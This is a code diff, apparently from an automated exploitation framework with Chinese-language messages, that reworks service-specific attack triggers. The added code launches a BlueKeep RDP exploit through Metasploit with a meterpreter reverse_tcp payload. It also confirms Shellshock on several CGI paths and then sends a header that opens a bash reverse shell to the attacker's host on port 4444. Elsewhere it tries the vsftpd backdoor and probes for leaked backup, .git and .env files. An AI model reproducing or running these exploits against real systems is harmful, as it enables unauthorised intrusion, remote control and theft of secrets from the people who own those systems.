@@ -43,20 +43,25 @@ class Module:
         }
 
     def exploit(self, target_ip=None, target_port=None, lhost=None, session=None):
-        # 如果传入了 target_port 则只尝试该端口，否则尝试所有已知触发端口
         if target_port is not None:
             ports_to_try = [target_port]
         else:
             ports_to_try = list(self.triggers.keys())
-    
+
         for port in ports_to_try:
             safe_print(f"{Fore.GREEN}[*] 尝试对端口 {port} 进行欺骗攻击...")
-            success, result = self.triggers.get(port, lambda a,b,c: (False, "无载荷"))(target_ip, port, lhost)
+            try:
+                fn = self.triggers.get(port)
+                if fn is None:
+                    continue
+                success, result = fn(target_ip, port, lhost)
+            except Exception as e:
+                safe_print(f"{Fore.RED}[-] 端口 {port} 触发异常: {e!r}")
+                continue
             if success:
                 return True, result
         return False, f"{Fore.RED}所有端口欺骗攻击均未成功"
 
-    # ---------- 各服务触发函数----------
     def ftp_triggers(self, target_ip, port, lhost):
         # 尝试 vsftpd 2.3.4 笑脸后门
         try:
@@ -229,36 +234,64 @@ class Module:
             return False, f"MySQL利用错误: {e}"
 
     def rdp_trigger(self, target_ip, port, lhost):
-        """RDP BlueKeep (CVE-2019-0708) 触发"""
-        # BlueKeep需要构造特殊RDP包，可通过MSF调用
-        # 这里直接调用MSF RPC
+        if not getattr(self, 'msf_client', None):
+            return False, "需要MSF客户端支持BlueKeep"
         try:
-            # 假设主程序已将msf_client传入
-            if hasattr(self, 'msf_client') and self.msf_client:
-                exploit = self.msf_client.modules.use('exploit', 'windows/rdp/cve_2019_0708_bluekeep_rce')
-                exploit['RHOSTS'] = target_ip
-                exploit['RPORT'] = port
-                exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
-                exploit['LHOST'] = lhost
-                exploit['LPORT'] = 4444
-                exploit.execute()
-                return True, f"BlueKeep已尝试，监听 {lhost}:4444"
-            else:
-                return False, "需要MSF客户端支持BlueKeep"
+            exploit = self.msf_client.modules.use(
+                'exploit', 'windows/rdp/cve_2019_0708_bluekeep_rce'
+            )
+            exploit['RHOSTS'] = target_ip
+            exploit['RPORT'] = port
+            result = exploit.execute(
+                payload="windows/x64/meterpreter/reverse_tcp",
+                options={"LHOST": lhost, "LPORT": 4444},
+            )
+            if result and result.get("job_id"):
+                return True, f"BlueKeep 已提交 (job {result['job_id']})，监听 {lhost}:4444"
+            return False, f"BlueKeep 提交失败: {result}"
         except Exception as e:
-            return False, f"BlueKeep利用失败: {e}"
+            return False, f"BlueKeep 利用失败: {e!r}"
 
     def http_trigger(self, target_ip, port, lhost):
         """常见Web漏洞：Shellshock、文件包含、备份文件等"""
         import requests
         base_url = f"http://{target_ip}:{port}" if port != 443 else f"https://{target_ip}:{port}"
         # 1. Shellshock 测试
-        headers = {'User-Agent': '() { :; }; echo; /bin/bash -c "bash -i >& /dev/tcp/'+lhost+'/4444 0>&1"'}
-        try:
-            r = requests.get(base_url + "/cgi-bin/test.cgi", headers=headers, timeout=3, verify=False)
-            return True, f"Shellshock尝试，监听 {lhost}:4444"
-        except:
-            pass
+        import uuid
+        marker = "SHELLSHOCK_" + uuid.uuid4().hex[:12]
+        sh_headers = {
+            "User-Agent":        f"() {{ :; }}; echo; echo {marker}",
+            "Referer":           f"() {{ :; }}; echo; echo {marker}",
+            "X-Test-Shellshock": f"() {{ :; }}; echo; echo {marker}",
+        }
+        cgi_paths = ("/cgi-bin/test.cgi", "/cgi-bin/status",
+                     "/cgi-bin/admin", "/cgi-bin/ping")
+        shellshock_confirmed = False
+        for cgi in cgi_paths:
+            try:
+                r = requests.get(base_url + cgi, headers=sh_headers,
+                                 timeout=3, verify=False)
+                if marker in r.text:
+                    shellshock_confirmed = True
+                    break
+            except Exception:
+                pass
+
+        if shellshock_confirmed:
+            # 确认漏洞后，再发一次反弹 shell（成功与否需监听端确认）
+            rev_headers = {
+                "User-Agent": f"() {{ :; }}; /bin/bash -c 'bash -i >& /dev/tcp/{lhost}/4444 0>&1'",
+            }
+            for cgi in cgi_paths:
+                try:
+                    requests.get(base_url + cgi, headers=rev_headers,
+                                 timeout=2, verify=False)
+                except Exception:
+                    pass
+            return True, (
+                f"Shellshock 命令执行成功"
+                f"已尝试反弹至 {lhost}:4444"
+            )
 
         # 2. 常见备份文件泄露
         backups = ['/backup.zip', '/www.zip', '/web.zip', '/backup.tar.gz', '/.git/config', '/.env']
